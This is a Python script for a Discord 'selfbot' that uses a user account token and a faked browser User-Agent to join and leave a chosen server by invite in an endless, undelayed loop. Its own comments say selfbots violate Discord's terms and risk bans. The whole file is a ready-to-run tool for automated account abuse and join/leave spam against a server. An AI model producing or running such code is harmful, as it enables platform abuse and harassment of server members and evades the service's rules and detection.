import requests #pip install requests
import time
import datetime #pip install datetime
from colorama import Fore, init #pip install colorama
init(convert=True)



token = "ABCDEFGAFG" #user token - this is a selfbot - selfbots are against tos - USE A HIGH DELAY AND USE IN SHORT AMOUNTS IF THIS IS AN ACCOUNT YOU CARE ABOUT!
server = "aBcD123" #invite link - if the invite made is discord.gg/aBcD123 - you put aBcD123
serverid = "1234512345" #use developers mode and copy server id or use discord on a browser and look at the 1st number following https://discord.com/channels/

while True:
	headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
	requests.post(f"https://discord.com/api/v6/invites/{server}", headers=headers, timeout=10)
	currentDT = datetime.datetime.now()
	hour = str(currentDT.hour)
	minute = str(currentDT.minute)
	second = str(currentDT.second)
	print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Joined discord.gg/{server}")
	#time.sleep(10) #this is for when your using it on important accs - this will get them banned if done a lot and I will not take any responsibility!
	headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
	requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{serverid}', headers=headers, timeout=10)
	currentDT = datetime.datetime.now()
	hour = str(currentDT.hour)
	minute = str(currentDT.minute)
	second = str(currentDT.second)
	print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Left discord.gg/{server}")
	#time.sleep(10) #this is for when your using it on important accs - this will get them banned if done a lot and I will not take any responsibility!
	
